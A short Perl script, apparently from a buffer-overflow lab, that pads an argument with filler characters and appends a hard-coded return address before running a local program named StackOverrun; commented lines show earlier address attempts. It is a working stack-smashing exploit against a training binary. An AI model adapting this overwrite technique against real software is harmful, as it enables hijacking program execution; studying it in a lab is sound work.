
use warnings FATAL => 'all';
use strict;

my $sled = "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz";


#print("hello world");
#my $ arg = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"."\x90\x11\x40";
my $arg = $sled."\x02\x06\x40";
#my $ arg = $sled.$sled."\x40\x06\x02";

#$arg = "ABCDEFGHIJKLMNOP020604"."\x90\x11\x40";

my $cmd = "./StackOverrun ".$arg;

system($cmd);

#system("./StackOverrun ABCDEFGHIJKLMNOP"."/x90/x11/x40");

